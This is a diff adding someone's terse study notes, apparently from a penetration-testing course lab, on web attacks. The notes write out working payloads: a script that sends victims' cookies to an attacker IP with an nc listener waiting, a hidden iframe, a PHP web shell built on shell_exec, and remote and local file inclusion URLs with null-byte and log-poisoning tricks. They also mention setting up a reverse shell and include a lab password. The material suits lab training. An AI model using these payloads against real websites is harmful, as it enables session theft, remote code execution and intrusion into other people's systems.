@@ -1,0 +1,62 @@
+firefox tools
+cookiemanager + allows you to edit and manage cookies
+tamperdata
+
+check to see if web sanitize input
+javscript
+<script>alert("XSS");</script>
+STEALTHIER ATTACK --- this is an iframe attack
+<iframe SRC="http://192.168.14.220:81/report" height = "0" width = "0"></iframe>
+
+steal authentication cookies
+lab machine pass offsec 123456
+have victim browser send us their cookies'
+<script>new Image().src="http://192.168.14.220:81/bogus.php?output="+document.cookie;</script>
+start your port listner
+nc -lvp 81 wait for victim to visit site to steal cookie
+then replace cookie using cookie manager +
+
+
+local inclusion Inclusion lfi or rfi
+
+allow an attack to include a local or remote php code
+depends on php version and web server config
+php.ini register global and url allow wrapper
+rfi attacks
+allow php to include 
+lfi
+allow attacker to change existing php code which is more challenging
+
+
+remote file inclusion
+echo '<?php echo shell_exec("ipconfig");?>' > /var/www/evil.txt
+modify our lab machine website lang parameter to redirect to our local machine
+make sure your apache 2 is running
+and 
+tail -f /var/log/apache2/access.log
+termina null byte string to fix error
+%00 ignore everything after
+
+php.ini needs to have this settings to work
+allow_url_fopen = on
+allow_url_include = on  are both typically turned Off
+
+this issue can be overcome by using lfi by adding local files from the local file system like php code
+our options
+to contaminate log file
+of various services in a way the results php code written into this files
+consider this
+nc -nv 102.168.15.162 80
+and simply paste our php code
+<?php echo shell_exec($_GET['cmd']);?>
+192.168.15.162/addguestbook.php?name=cake&comment=lol&cmd=ipconfig&LANG=http://192.168.14.220/evil.txt%00&Submit=Submit
+this one for the example here
+http://192.168.15.162/addguestbook.php?name=cake&comment=lol&cmd=ipconfig&LANG=../../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit
+create a reverse shell
+option a lets say you don't have tftp ftp or anything available
+create vbs script or ps1 to copy nc.
+from your server then execute it
+
+not from the doctor to enum shit a this point
+http://www.fuzzysecurity.com/tutorials/16.html
+
